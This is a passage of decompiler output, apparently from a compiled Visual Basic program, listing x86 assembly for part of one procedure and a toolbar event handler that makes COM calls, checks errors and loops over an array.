  '00506500: mov [ebp-000000C0h], 00000008h
  '0050650A: mov eax, 00000010h
  '0050650F: call 004081B0h
  '00506514: mov edx, esp
  '00506516: mov eax, [ebp-000000D0h]
  '0050651C: mov [edx], eax
  '0050651E: mov ecx, [ebp-000000CCh]
  '00506524: mov [edx+04h], ecx
  '00506527: mov eax, [ebp-000000C8h]
  '0050652D: mov [edx+08h], eax
  '00506530: mov ecx, [ebp-000000C4h]
  '00506536: mov [edx+0Ch], ecx
  '00506539: mov eax, 00000010h
  '0050653E: call 004081B0h
  '00506543: mov edx, esp
  '00506545: mov eax, [ebp-000000C0h]
  '0050654B: mov [edx], eax
  '0050654D: mov ecx, [ebp-000000BCh]
  '00506553: mov [edx+04h], ecx
  '00506556: mov eax, [ebp-000000B8h]
  '0050655C: mov [edx+08h], eax
  '0050655F: mov ecx, [ebp-000000B4h]
  '00506565: mov [edx+0Ch], ecx
  '00506568: push 0041DA1Ch
  '0050656D: call [00401014h]
  '00506573: jmp 005066FCh
  '00506578: mov [ebp-04h], 0000001Fh
  '0050657F: lea edx, [ebp-3Ch]
  '00506582: push edx
  '00506583: mov eax, [ebp-24h]
  '00506586: mov ecx, [eax]
  '00506588: mov edx, [ebp-24h]
  '0050658B: push edx
  '0050658C: call [ecx+4Ch]
  '0050658F: fclex 
  '00506591: mov [ebp-0000012Ch], eax
  '00506597: cmp [ebp-0000012Ch], 00000000h
  '0050659E: jnl 5065C0h
  '005065A0: push 0000004Ch
  '005065A2: push 00422C68h
  '005065A7: mov eax, [ebp-24h]
  '005065AA: push eax
  '005065AB: mov ecx, [ebp-0000012Ch]
  '005065B1: push ecx
  '005065B2: call [004010A0h]
  '005065B8: mov [ebp-0000016Ch], eax
  '005065BE: jmp 5065CAh
  '005065C0: mov [ebp-0000016Ch], 00000000h
  '005065CA: push 00000007h
  '005065CC: mov edx, [ebp-3Ch]
  '005065CF: push edx
  '005065D0: call [00401354h]
  '005065D6: mov edx, eax
  '005065D8: lea ecx, [ebp-40h]
  '005065DB: call [00401378h]
  '005065E1: push eax
  '005065E2: push 00428A54h
  '005065E7: call [00401184h]
  '005065ED: neg eax
  '005065EF: sbb eax, eax
  '005065F1: inc eax
  '005065F2: neg eax
  '005065F4: mov [ebp-00000130h], ax
  '005065FB: lea eax, [ebp-40h]
  '005065FE: push eax
  '005065FF: lea ecx, [ebp-3Ch]
  '00506602: push ecx
  '00506603: push 00000002h
  '00506605: call [004012E8h]
  '0050660B: add esp, 0000000Ch
  '0050660E: movsx edx, word ptr [ebp-00000130h]
  '00506615: test edx, edx
  '00506617: jz 005066FCh
  '0050661D: mov [ebp-04h], 00000020h
  '00506624: lea eax, [ebp-3Ch]
  '00506627: push eax
  '00506628: mov ecx, [ebp-24h]
  '0050662B: mov edx, [ecx]
  '0050662D: mov eax, [ebp-24h]
  '00506630: push eax
  '00506631: call [edx+4Ch]
  '00506634: fclex 
  '00506636: mov [ebp-0000012Ch], eax
  '0050663C: cmp [ebp-0000012Ch], 00000000h
  '00506643: jnl 506665h
  '00506645: push 0000004Ch
  '00506647: push 00422C68h
  '0050664C: mov ecx, [ebp-24h]
  '0050664F: push ecx
  '00506650: mov edx, [ebp-0000012Ch]
  '00506656: push edx
  '00506657: call [004010A0h]
  '0050665D: mov [ebp-00000170h], eax
  '00506663: jmp 50666Fh
  '00506665: mov [ebp-00000170h], 00000000h
  '0050666F: mov eax, [ebp-3Ch]
  '00506672: mov [ebp-00000158h], eax
  '00506678: mov [ebp-3Ch], 00000000h
  '0050667F: mov edx, [ebp-00000158h]
  '00506685: lea ecx, [ebp-40h]
  '00506688: call [00401378h]
  '0050668E: lea ecx, [ebp-40h]
  '00506691: push ecx
  '00506692: mov edx, [ebp+08h]
  '00506695: mov eax, [edx]
  '00506697: mov ecx, [ebp+08h]
  '0050669A: push ecx
  '0050669B: call [eax+0000071Ch]
  '005066A1: lea ecx, [ebp-40h]
  '005066A4: call [004013B4h]
  '005066AA: mov [ebp-04h], 00000021h
  '005066B1: mov edx, [ebp+08h]
  '005066B4: mov eax, [edx]
  '005066B6: mov ecx, [ebp+08h]
  '005066B9: push ecx
  '005066BA: call [eax+000006FCh]
  '005066C0: mov [ebp-0000012Ch], eax
  '005066C6: cmp [ebp-0000012Ch], 00000000h
  '005066CD: jnl 5066F2h
  '005066CF: push 000006FCh
  '005066D4: push 00422CD4h
  '005066D9: mov edx, [ebp+08h]
  '005066DC: push edx
  '005066DD: mov eax, [ebp-0000012Ch]
  '005066E3: push eax
  '005066E4: call [004010A0h]
  '005066EA: mov [ebp-00000174h], eax
  '005066F0: jmp 5066FCh
  '005066F2: mov [ebp-00000174h], 00000000h
  '005066FC: mov [ebp-10h], 00000000h
  '00506703: push 0050677Fh
  '00506708: jmp 50674Eh
  '0050670A: lea ecx, [ebp-40h]
  '0050670D: push ecx
  '0050670E: lea edx, [ebp-3Ch]
  '00506711: push edx
  '00506712: push 00000002h
  '00506714: call [004012E8h]
  '0050671A: add esp, 0000000Ch
  '0050671D: lea eax, [ebp-000000B0h]
  '00506723: push eax
  '00506724: lea ecx, [ebp-000000A0h]
  '0050672A: push ecx
  '0050672B: lea edx, [ebp-00000090h]
  '00506731: push edx
  '00506732: lea eax, [ebp-80h]
  '00506735: push eax
  '00506736: lea ecx, [ebp-70h]
  '00506739: push ecx
  '0050673A: lea edx, [ebp-60h]
  '0050673D: push edx
  '0050673E: lea eax, [ebp-50h]
  '00506741: push eax
  '00506742: push 00000007h
  '00506744: call [00401050h]
  '0050674A: add esp, 00000020h
  '0050674D: ret 
End Sub
Private Sub Toolbar1__505010
  '00505010: push ebp
  '00505011: mov ebp, esp
  '00505013: sub esp, 00000018h
  '00505016: push 004081B6h
  '0050501B: mov eax, fs:[00h]
  '00505021: push eax
  '00505022: mov fs:[00000000h], esp
  '00505029: mov eax, 00000108h
  '0050502E: call 004081B0h
  '00505033: push ebx
  '00505034: push esi
  '00505035: push edi
  '00505036: mov [ebp-18h], esp
  '00505039: mov [ebp-14h], 00406080h
  '00505040: mov eax, [ebp+08h]
  '00505043: and eax, 00000001h
  '00505046: mov [ebp-10h], eax
  '00505049: mov ecx, [ebp+08h]
  '0050504C: and ecx, FFFFFFFEh
  '0050504F: mov [ebp+08h], ecx
  '00505052: mov [ebp-0Ch], 00000000h
  '00505059: mov edx, [ebp+08h]
  '0050505C: mov eax, [edx]
  '0050505E: mov ecx, [ebp+08h]
  '00505061: push ecx
  '00505062: call [eax+04h]
  '00505065: mov [ebp-04h], 00000001h
  '0050506C: mov edx, [ebp+0Ch]
  '0050506F: push edx
  '00505070: lea eax, [ebp-30h]
  '00505073: push eax
  '00505074: call [004010F8h]
  '0050507A: mov [ebp-04h], 00000002h
  '00505081: push FFFFFFFFh
  '00505083: call [004010E8h]
  '00505089: mov [ebp-04h], 00000003h
  '00505090: lea ecx, [ebp-40h]
  '00505093: push ecx
  '00505094: mov edx, [ebp-30h]
  '00505097: mov eax, [edx]
  '00505099: mov ecx, [ebp-30h]
  '0050509C: push ecx
  '0050509D: call [eax+000000A4h]
  '005050A3: fclex 
  '005050A5: mov [ebp-000000ACh], eax
  '005050AB: cmp [ebp-000000ACh], 00000000h
  '005050B2: jnl 5050D7h
  '005050B4: push 000000A4h
  '005050B9: push 0041C048h
  '005050BE: mov edx, [ebp-30h]
  '005050C1: push edx
  '005050C2: mov eax, [ebp-000000ACh]
  '005050C8: push eax
  '005050C9: call [004010A0h]
  '005050CF: mov [ebp-000000E4h], eax
  '005050D5: jmp 5050E1h
  '005050D7: mov [ebp-000000E4h], 00000000h
  '005050E1: mov ecx, [ebp-40h]
  '005050E4: mov [ebp-000000B0h], ecx
  '005050EA: mov edx, [ebp-000000B0h]
  '005050F0: mov eax, [edx]
  '005050F2: mov ecx, [ebp-000000B0h]
  '005050F8: push ecx
  '005050F9: call [eax+38h]
  '005050FC: fclex 
  '005050FE: mov [ebp-000000B4h], eax
  '00505104: cmp [ebp-000000B4h], 00000000h
  '0050510B: jnl 505130h
  '0050510D: push 00000038h
  '0050510F: push 00422944h
  '00505114: mov edx, [ebp-000000B0h]
  '0050511A: push edx
  '0050511B: mov eax, [ebp-000000B4h]
  '00505121: push eax
  '00505122: call [004010A0h]
  '00505128: mov [ebp-000000E8h], eax
  '0050512E: jmp 50513Ah
  '00505130: mov [ebp-000000E8h], 00000000h
  '0050513A: lea ecx, [ebp-40h]
  '0050513D: call [004013B8h]
  '00505143: mov [ebp-04h], 00000004h
  '0050514A: lea ecx, [ebp-3Ch]
  '0050514D: push ecx
  '0050514E: mov edx, [ebp-30h]
  '00505151: mov eax, [edx]
  '00505153: mov ecx, [ebp-30h]
  '00505156: push ecx
  '00505157: call [eax+24h]
  '0050515A: fclex 
  '0050515C: mov [ebp-000000ACh], eax
  '00505162: cmp [ebp-000000ACh], 00000000h
  '00505169: jnl 50518Bh
  '0050516B: push 00000024h
  '0050516D: push 0041C048h
  '00505172: mov edx, [ebp-30h]
  '00505175: push edx
  '00505176: mov eax, [ebp-000000ACh]
  '0050517C: push eax
  '0050517D: call [004010A0h]
  '00505183: mov [ebp-000000ECh], eax
  '00505189: jmp 505195h
  '0050518B: mov [ebp-000000ECh], 00000000h
  '00505195: mov ecx, [ebp-3Ch]
  '00505198: mov [ebp-000000DCh], ecx
  '0050519E: mov [ebp-3Ch], 00000000h
  '005051A5: mov edx, [ebp-000000DCh]
  '005051AB: mov [ebp-4Ch], edx
  '005051AE: mov [ebp-54h], 00000008h
  '005051B5: lea eax, [ebp-54h]
  '005051B8: push eax
  '005051B9: lea ecx, [ebp-64h]
  '005051BC: push ecx
  '005051BD: call [00401174h]
  '005051C3: mov [ebp-7Ch], 00426E84h
  '005051CA: mov [ebp-00000084h], 00008008h
  '005051D4: lea edx, [ebp-64h]
  '005051D7: push edx
  '005051D8: lea eax, [ebp-00000084h]
  '005051DE: push eax
  '005051DF: call [00401198h]
  '005051E5: mov [ebp-000000B0h], ax
  '005051EC: lea ecx, [ebp-64h]
  '005051EF: push ecx
  '005051F0: lea edx, [ebp-54h]
  '005051F3: push edx
  '005051F4: push 00000002h
  '005051F6: call [00401050h]
  '005051FC: add esp, 0000000Ch
  '005051FF: movsx eax, word ptr [ebp-000000B0h]
  '00505206: test eax, eax
  '00505208: jz 005057D7h
  '0050520E: mov [ebp-04h], 00000005h
  '00505215: mov [ebp-7Ch], 80020004h
  '0050521C: mov [ebp-00000084h], 0000000Ah
  '00505226: mov eax, 00000010h
  '0050522B: call 004081B0h
  '00505230: mov ecx, esp
  '00505232: mov edx, [ebp-00000084h]
  '00505238: mov [ecx], edx
  '0050523A: mov eax, [ebp-80h]
  '0050523D: mov [ecx+04h], eax
  '00505240: mov edx, [ebp-7Ch]
  '00505243: mov [ecx+08h], edx
  '00505246: mov eax, [ebp-78h]
  '00505249: mov [ecx+0Ch], eax
  '0050524C: push 00428DBCh
  '00505251: push 00428DA4h
  '00505256: push 0041DA1Ch
  '0050525B: call [00401314h]
  '00505261: mov edx, eax
  '00505263: lea ecx, [ebp-28h]
  '00505266: call [00401378h]
  '0050526C: mov [ebp-04h], 00000006h
  '00505273: mov ecx, [ebp-28h]
  '00505276: push ecx
  '00505277: push 0041BC60h
  '0050527C: call [00401184h]
  '00505282: test eax, eax
  '00505284: jnz 005053CEh
  '0050528A: mov [ebp-04h], 00000007h
  '00505291: lea edx, [ebp-40h]
  '00505294: push edx
  '00505295: mov eax, [ebp-30h]
  '00505298: mov ecx, [eax]
  '0050529A: mov edx, [ebp-30h]
  '0050529D: push edx
  '0050529E: call [ecx+000000A4h]
  '005052A4: fclex 
  '005052A6: mov [ebp-000000ACh], eax
  '005052AC: cmp [ebp-000000ACh], 00000000h
  '005052B3: jnl 5052D8h
  '005052B5: push 000000A4h
  '005052BA: push 0041C048h
  '005052BF: mov eax, [ebp-30h]
  '005052C2: push eax
  '005052C3: mov ecx, [ebp-000000ACh]
  '005052C9: push ecx
  '005052CA: call [004010A0h]
  '005052D0: mov [ebp-000000F0h], eax
  '005052D6: jmp 5052E2h
  '005052D8: mov [ebp-000000F0h], 00000000h
  '005052E2: mov edx, [ebp-40h]
  '005052E5: mov [ebp-000000B0h], edx
  '005052EB: mov [ebp-0000009Ch], 00422C7Ch
  '005052F5: mov [ebp-000000A4h], 00000008h
  '005052FF: lea edx, [ebp-000000A4h]
  '00505305: lea ecx, [ebp-74h]
  '00505308: call [00401338h]
  '0050530E: mov [ebp-0000008Ch], 004229D8h
  '00505318: mov [ebp-00000094h], 00000008h
  '00505322: lea edx, [ebp-00000094h]
  '00505328: lea ecx, [ebp-64h]
  '0050532B: call [00401338h]
  '00505331: mov [ebp-4Ch], 00000001h
  '00505338: mov [ebp-54h], 00000002h
  '0050533F: lea eax, [ebp-44h]
  '00505342: push eax
  '00505343: lea ecx, [ebp-74h]
  '00505346: push ecx
  '00505347: lea edx, [ebp-64h]
  '0050534A: push edx
  '0050534B: lea eax, [ebp-54h]
  '0050534E: push eax
  '0050534F: mov ecx, [ebp-000000B0h]
  '00505355: mov edx, [ecx]
  '00505357: mov eax, [ebp-000000B0h]
  '0050535D: push eax
  '0050535E: call [edx+3Ch]
  '00505361: fclex 
  '00505363: mov [ebp-000000B4h], eax
  '00505369: cmp [ebp-000000B4h], 00000000h
  '00505370: jnl 505395h
  '00505372: push 0000003Ch
  '00505374: push 00422944h
  '00505379: mov ecx, [ebp-000000B0h]
  '0050537F: push ecx
  '00505380: mov edx, [ebp-000000B4h]
  '00505386: push edx
  '00505387: call [004010A0h]
  '0050538D: mov [ebp-000000F4h], eax
  '00505393: jmp 50539Fh
  '00505395: mov [ebp-000000F4h], 00000000h
  '0050539F: lea eax, [ebp-44h]
  '005053A2: push eax
  '005053A3: lea ecx, [ebp-40h]
  '005053A6: push ecx
  '005053A7: push 00000002h
  '005053A9: call [00401064h]
  '005053AF: add esp, 0000000Ch
  '005053B2: lea edx, [ebp-74h]
  '005053B5: push edx
  '005053B6: lea eax, [ebp-64h]
  '005053B9: push eax
  '005053BA: lea ecx, [ebp-54h]
  '005053BD: push ecx
  '005053BE: push 00000003h
  '005053C0: call [00401050h]
  '005053C6: add esp, 00000010h
  '005053C9: jmp 005057D2h
  '005053CE: mov [ebp-04h], 00000009h
  '005053D5: mov [ebp-7Ch], 0041DE10h
  '005053DC: mov [ebp-00000084h], 00000008h
  '005053E6: lea edx, [ebp-00000084h]
  '005053EC: lea ecx, [ebp-54h]
  '005053EF: call [00401338h]
  '005053F5: push 00000000h
  '005053F7: push FFFFFFFFh
  '005053F9: lea edx, [ebp-54h]
  '005053FC: push edx
  '005053FD: mov eax, [ebp-28h]
  '00505400: push eax
  '00505401: lea ecx, [ebp-64h]
  '00505404: push ecx
  '00505405: call [0040122Ch]
  '0050540B: lea edx, [ebp-64h]
  '0050540E: push edx
  '0050540F: push 00002008h
  '00505414: call [004010B0h]
  '0050541A: mov [ebp-000000A8h], eax
  '00505420: lea eax, [ebp-000000A8h]
  '00505426: push eax
  '00505427: lea ecx, [ebp-24h]
  '0050542A: push ecx
  '0050542B: call [00401374h]
  '00505431: lea edx, [ebp-64h]
  '00505434: push edx
  '00505435: lea eax, [ebp-54h]
  '00505438: push eax
  '00505439: push 00000002h
  '0050543B: call [00401050h]
  '00505441: add esp, 0000000Ch
  '00505444: mov [ebp-04h], 0000000Ah
  '0050544B: mov ecx, [ebp-24h]
  '0050544E: push ecx
  '0050544F: push 00000001h
  '00505451: call [00401268h]
  '00505457: mov ecx, eax
  '00505459: call [004011A8h]
  '0050545F: mov [ebp-000000C4h], ax
  '00505466: mov word ptr [ebp-000000C0h], 0001h
  '0050546F: mov edx, [ebp-24h]
  '00505472: push edx
  '00505473: push 00000001h
  '00505475: call [004011D0h]
  '0050547B: mov ecx, eax
  '0050547D: call [004011A8h]
  '00505483: mov [ebp-2Ch], ax
  '00505487: jmp 50549Eh
  '00505489: mov ax, [ebp-2Ch]
  '0050548D: add ax, [ebp-000000C0h]
  '00505494: jo 00505BB7h
  '0050549A: mov [ebp-2Ch], ax
  '0050549E: mov cx, [ebp-2Ch]
  '005054A2: cmp cx, [ebp-000000C4h]
  '005054A9: jnle 005057D2h
  '005054AF: mov [ebp-04h], 0000000Bh
  '005054B6: mov edx, [ebp-24h]
  '005054B9: push edx
  '005054BA: lea eax, [ebp-34h]
  '005054BD: push eax
  '005054BE: call [00401324h]
  '005054C4: cmp [ebp-34h], 00000000h
  '005054C8: jz 50551Ah
  '005054CA: mov ecx, [ebp-34h]
  '005054CD: cmp word ptr [ecx], 0001h
  '005054D1: jnz 50551Ah
  '005054D3: movsx edx, word ptr [ebp-2Ch]
  '005054D7: mov eax, [ebp-34h]
  '005054DA: sub edx, [eax+14h]
  '005054DD: mov [ebp-000000ACh], edx
  '005054E3: mov ecx, [ebp-34h]
  '005054E6: mov edx, [ebp-000000ACh]
  '005054EC: cmp edx, [ecx+10h]
  '005054EF: jnb 5054FDh
  '005054F1: mov [ebp-000000F8h], 00000000h
  '005054FB: jmp 505509h
  '005054FD: call [00401178h]
  '00505503: mov [ebp-000000F8h], eax
  '00505509: mov eax, [ebp-000000ACh]
  '0050550F: shl eax, 02h
  '00505512: mov [ebp-000000FCh], eax
  '00505518: jmp 505526h
  '0050551A: call [00401178h]
  '00505520: mov [ebp-000000FCh], eax
  '00505526: mov ecx, [ebp-34h]
  '00505529: mov edx, [ecx+0Ch]
  '0050552C: add edx, [ebp-000000FCh]
  '00505532: mov [ebp-7Ch], edx
  '00505535: mov [ebp-00000084h], 00004008h
  '0050553F: lea eax, [ebp-00000084h]
  '00505545: push eax
  '00505546: lea ecx, [ebp-54h]
  '00505549: push ecx
  '0050554A: call [00401118h]
  '00505550: lea edx, [ebp-34h]
  '00505553: push edx
  '00505554: call [004013A8h]
  '0050555A: mov [ebp-0000008Ch], 0041BC60h
  '00505564: mov [ebp-00000094h], 00008008h
  '0050556E: lea eax, [ebp-54h]
  '00505571: push eax
  '00505572: lea ecx, [ebp-00000094h]
  '00505578: push ecx
  '00505579: call [00401308h]
  '0050557F: mov [ebp-000000B0h], ax
  '00505586: lea ecx, [ebp-54h]
  '00505589: call [00401030h]
  '0050558F: movsx edx, word ptr [ebp-000000B0h]
  '00505596: test edx, edx
  '00505598: jz 005057C6h
  '0050559E: mov [ebp-04h], 0000000Ch
  '005055A5: lea eax, [ebp-40h]
  '005055A8: push eax
  '005055A9: mov ecx, [ebp-30h]
  '005055AC: mov edx, [ecx]
  '005055AE: mov eax, [ebp-30h]
  '005055B1: push eax
  '005055B2: call [edx+000000A4h]
  '005055B8: fclex 
  '005055BA: mov [ebp-000000B4h], eax
  '005055C0: cmp [ebp-000000B4h], 00000000h
  '005055C7: jnl 5055ECh
  '005055C9: push 000000A4h
  '005055CE: push 0041C048h
  '005055D3: mov ecx, [ebp-30h]
  '005055D6: push ecx
  '005055D7: mov edx, [ebp-000000B4h]
  '005055DD: push edx
  '005055DE: call [004010A0h]
  '005055E4: mov [ebp-00000100h], eax
  '005055EA: jmp 5055F6h
  '005055EC: mov [ebp-00000100h], 00000000h
  '005055F6: mov eax, [ebp-40h]
  '005055F9: mov [ebp-000000B8h], eax
  '005055FF: mov ecx, [ebp-24h]
  '00505602: push ecx
  '00505603: lea edx, [ebp-38h]
  '00505606: push edx
  '00505607: call [00401324h]
  '0050560D: cmp [ebp-38h], 00000000h
  '00505611: jz 505663h
  '00505613: mov eax, [ebp-38h]
  '00505616: cmp word ptr [eax], 0001h
  '0050561A: jnz 505663h
  '0050561C: movsx ecx, word ptr [ebp-2Ch]
  '00505620: mov edx, [ebp-38h]
  '00505623: sub ecx, [edx+14h]
  '00505626: mov [ebp-000000B0h], ecx
  '0050562C: mov eax, [ebp-38h]
  '0050562F: mov ecx, [ebp-000000B0h]
  '00505635: cmp ecx, [eax+10h]
  '00505638: jnb 505646h
  '0050563A: mov [ebp-00000104h], 00000000h
  '00505644: jmp 505652h
  '00505646: call [00401178h]
  '0050564C: mov [ebp-00000104h], eax
  '00505652: mov edx, [ebp-000000B0h]
  '00505658: shl edx, 02h
  '0050565B: mov [ebp-00000108h], edx
  '00505661: jmp 50566Fh
  '00505663: call [00401178h]
  '00505669: mov [ebp-00000108h], eax
  '0050566F: mov eax, [ebp-38h]
  '00505672: mov ecx, [eax+0Ch]
  '00505675: add ecx, [ebp-00000108h]
  '0050567B: mov [ebp-0000009Ch], ecx
  '00505681: mov [ebp-000000A4h], 00004008h
  '0050568B: mov edx, [ebp-24h]
  '0050568E: push edx
  '0050568F: lea eax, [ebp-34h]
  '00505692: push eax
  '00505693: call [00401324h]
  '00505699: cmp [ebp-34h], 00000000h
  '0050569D: jz 5056EFh
  '0050569F: mov ecx, [ebp-34h]
  '005056A2: cmp word ptr [ecx], 0001h
  '005056A6: jnz 5056EFh
  '005056A8: movsx edx, word ptr [ebp-2Ch]
  '005056AC: mov eax, [ebp-34h]
  '005056AF: sub edx, [eax+14h]
  '005056B2: mov [ebp-000000ACh], edx
  '005056B8: mov ecx, [ebp-34h]
  '005056BB: mov edx, [ebp-000000ACh]
  '005056C1: cmp edx, [ecx+10h]
  '005056C4: jnb 5056D2h
  '005056C6: mov [ebp-0000010Ch], 00000000h
  '005056D0: jmp 5056DEh
  '005056D2: call [00401178h]
  '005056D8: mov [ebp-0000010Ch], eax
  '005056DE: mov eax, [ebp-000000ACh]
  '005056E4: shl eax, 02h
  '005056E7: mov [ebp-00000110h], eax
  '005056ED: jmp 5056FBh
  '005056EF: call [00401178h]
  '005056F5: mov [ebp-00000110h], eax
  '005056FB: mov ecx, [ebp-34h]
  '005056FE: mov edx, [ecx+0Ch]
  '00505701: add edx, [ebp-00000110h]
  '00505707: mov [ebp-0000008Ch], edx
  '0050570D: mov [ebp-00000094h], 00004008h
  '00505717: mov ax, [ebp-2Ch]
  '0050571B: add ax, 0001h
  '0050571F: jo 00505BB7h
  '00505725: mov [ebp-4Ch], ax
  '00505729: mov [ebp-54h], 00000002h
  '00505730: lea ecx, [ebp-44h]
  '00505733: push ecx
  '00505734: lea edx, [ebp-000000A4h]
  '0050573A: push edx
  '0050573B: lea eax, [ebp-00000094h]
  '00505741: push eax
  '00505742: lea ecx, [ebp-54h]
  '00505745: push ecx
  '00505746: mov edx, [ebp-000000B8h]
  '0050574C: mov eax, [edx]
  '0050574E: mov ecx, [ebp-000000B8h]
  '00505754: push ecx
  '00505755: call [eax+3Ch]
  '00505758: fclex 
  '0050575A: mov [ebp-000000BCh], eax
  '00505760: cmp [ebp-000000BCh], 00000000h
  '00505767: jnl 50578Ch
  '00505769: push 0000003Ch
  '0050576B: push 00422944h
  '00505770: mov edx, [ebp-000000B8h]
  '00505776: push edx
  '00505777: mov eax, [ebp-000000BCh]
  '0050577D: push eax
  '0050577E: call [004010A0h]
  '00505784: mov [ebp-00000114h], eax
  '0050578A: jmp 505796h
  '0050578C: mov [ebp-00000114h], 00000000h
  '00505796: lea ecx, [ebp-34h]
  '00505799: push ecx
  '0050579A: call [004013A8h]
  '005057A0: lea edx, [ebp-38h]
  '005057A3: push edx
  '005057A4: call [004013A8h]
  '005057AA: lea eax, [ebp-44h]
  '005057AD: push eax
  '005057AE: lea ecx, [ebp-40h]
  '005057B1: push ecx
  '005057B2: push 00000002h
  '005057B4: call [00401064h]
  '005057BA: add esp, 0000000Ch
  '005057BD: lea ecx, [ebp-54h]
  '005057C0: call [00401030h]
  '005057C6: mov [ebp-04h], 0000000Eh
  '005057CD: jmp 00505489h
  '005057D2: jmp 00505B20h
  '005057D7: mov [ebp-04h], 00000010h
  '005057DE: lea edx, [ebp-3Ch]
  '005057E1: push edx
  '005057E2: mov eax, [ebp-30h]
  '005057E5: mov ecx, [eax]
  '005057E7: mov edx, [ebp-30h]
  '005057EA: push edx
  '005057EB: call [ecx+24h]
  '005057EE: fclex 
  '005057F0: mov [ebp-000000ACh], eax
  '005057F6: cmp [ebp-000000ACh], 00000000h
  '005057FD: jnl 50581Fh
  '005057FF: push 00000024h
  '00505801: push 0041C048h
  '00505806: mov eax, [ebp-30h]
  '00505809: push eax
  '0050580A: mov ecx, [ebp-000000ACh]
  '00505810: push ecx
  '00505811: call [004010A0h]
  '00505817: mov [ebp-00000118h], eax
  '0050581D: jmp 505829h
  '0050581F: mov [ebp-00000118h], 00000000h
  '00505829: mov edx, [ebp-3Ch]
  '0050582C: mov [ebp-000000E0h], edx
  '00505832: mov [ebp-3Ch], 00000000h
  '00505839: mov eax, [ebp-000000E0h]
  '0050583F: mov [ebp-4Ch], eax
  '00505842: mov [ebp-54h], 00000008h
  '00505849: lea ecx, [ebp-54h]
  '0050584C: push ecx
  '0050584D: lea edx, [ebp-64h]
  '00505850: push edx
  '00505851: call [00401174h]
  '00505857: mov [ebp-7Ch], 00428DD8h
  '0050585E: mov [ebp-00000084h], 00008008h
  '00505868: lea eax, [ebp-64h]
  '0050586B: push eax
  '0050586C: lea ecx, [ebp-00000084h]
  '00505872: push ecx
  '00505873: call [00401198h]
  '00505879: mov [ebp-000000B0h], ax
  '00505880: lea edx, [ebp-64h]
  '00505883: push edx
  '00505884: lea eax, [ebp-54h]
  '00505887: push eax
  '00505888: push 00000002h
  '0050588A: call [00401050h]
  '00505890: add esp, 0000000Ch
  '00505893: movsx ecx, word ptr [ebp-000000B0h]
  '0050589A: test ecx, ecx
  '0050589C: jz 00505B20h
  '005058A2: mov [ebp-04h], 00000011h
  '005058A9: lea edx, [ebp-40h]
  '005058AC: push edx
  '005058AD: mov eax, [ebp-30h]
  '005058B0: mov ecx, [eax]
  '005058B2: mov edx, [ebp-30h]
  '005058B5: push edx
  '005058B6: call [ecx+000000A4h]
  '005058BC: fclex 
  '005058BE: mov [ebp-000000ACh], eax
  '005058C4: cmp [ebp-000000ACh], 00000000h
  '005058CB: jnl 5058F0h
  '005058CD: push 000000A4h
  '005058D2: push 0041C048h
  '005058D7: mov eax, [ebp-30h]
  '005058DA: push eax
  '005058DB: mov ecx, [ebp-000000ACh]
  '005058E1: push ecx
  '005058E2: call [004010A0h]
  '005058E8: mov [ebp-0000011Ch], eax
  '005058EE: jmp 5058FAh
  '005058F0: mov [ebp-0000011Ch], 00000000h
  '005058FA: mov edx, [ebp-40h]
  '005058FD: mov [ebp-000000B0h], edx
  '00505903: mov [ebp-0000009Ch], 00428DF4h
  '0050590D: mov [ebp-000000A4h], 00000008h
  '00505917: lea edx, [ebp-000000A4h]
  '0050591D: lea ecx, [ebp-74h]
  '00505920: call [00401338h]
  '00505926: mov [ebp-0000008Ch], 00422718h
  '00505930: mov [ebp-00000094h], 00000008h
  '0050593A: lea edx, [ebp-00000094h]
  '00505940: lea ecx, [ebp-64h]
  '00505943: call [00401338h]
  '00505949: mov [ebp-4Ch], 00000001h
  '00505950: mov [ebp-54h], 00000002h
  '00505957: lea eax, [ebp-44h]
  '0050595A: push eax
  '0050595B: lea ecx, [ebp-74h]
  '0050595E: push ecx
  '0050595F: lea edx, [ebp-64h]
  '00505962: push edx
  '00505963: lea eax, [ebp-54h]
  '00505966: push eax
  '00505967: mov ecx, [ebp-000000B0h]
  '0050596D: mov edx, [ecx]
  '0050596F: mov eax, [ebp-000000B0h]
  '00505975: push eax
  '00505976: call [edx+3Ch]
  '00505979: fclex 
  '0050597B: mov [ebp-000000B4h], eax
  '00505981: cmp [ebp-000000B4h], 00000000h
  '00505988: jnl 5059ADh
  '0050598A: push 0000003Ch
  '0050598C: push 00422944h
  '00505991: mov ecx, [ebp-000000B0h]
  '00505997: push ecx
  '00505998: mov edx, [ebp-000000B4h]
  '0050599E: push edx
  '0050599F: call [004010A0h]
  '005059A5: mov [ebp-00000120h], eax
  '005059AB: jmp 5059B7h
  '005059AD: mov [ebp-00000120h], 00000000h
  '005059B7: lea eax, [ebp-44h]
  '005059BA: push eax
  '005059BB: lea ecx, [ebp-40h]
  '005059BE: push ecx
  '005059BF: push 00000002h
  '005059C1: call [00401064h]
  '005059C7: add esp, 0000000Ch
  '005059CA: lea edx, [ebp-74h]
  '005059CD: push edx
  '005059CE: lea eax, [ebp-64h]
  '005059D1: push eax
  '005059D2: lea ecx, [ebp-54h]
  '005059D5: push ecx
  '005059D6: push 00000003h
  '005059D8: call [00401050h]
  '005059DE: add esp, 00000010h
  '005059E1: mov [ebp-04h], 00000012h
  '005059E8: lea edx, [ebp-40h]
  '005059EB: push edx
  '005059EC: mov eax, [ebp-30h]
  '005059EF: mov ecx, [eax]
  '005059F1: mov edx, [ebp-30h]
  '005059F4: push edx
  '005059F5: call [ecx+000000A4h]
  '005059FB: fclex 
  '005059FD: mov [ebp-000000ACh], eax
  '00505A03: cmp [ebp-000000ACh], 00000000h
  '00505A0A: jnl 505A2Fh
  '00505A0C: push 000000A4h
  '00505A11: push 0041C048h
  '00505A16: mov eax, [ebp-30h]
  '00505A19: push eax
  '00505A1A: mov ecx, [ebp-000000ACh]
  '00505A20: push ecx
  '00505A21: call [004010A0h]
  '00505A27: mov [ebp-00000124h], eax
  '00505A2D: jmp 505A39h
  '00505A2F: mov [ebp-00000124h], 00000000h
  '00505A39: mov edx, [ebp-40h]
  '00505A3C: mov [ebp-000000B0h], edx
  '00505A42: mov [ebp-0000009Ch], 00428E20h
  '00505A4C: mov [ebp-000000A4h], 00000008h
  '00505A56: lea edx, [ebp-000000A4h]
  '00505A5C: lea ecx, [ebp-74h]
  '00505A5F: call [00401338h]
  '00505A65: mov [ebp-0000008Ch], 00422AB0h
  '00505A6F: mov [ebp-00000094h], 00000008h
  '00505A79: lea edx, [ebp-00000094h]
  '00505A7F: lea ecx, [ebp-64h]
  '00505A82: call [00401338h]
  '00505A88: mov [ebp-4Ch], 00000002h
  '00505A8F: mov [ebp-54h], 00000002h
  '00505A96: lea eax, [ebp-44h]
  '00505A99: push eax
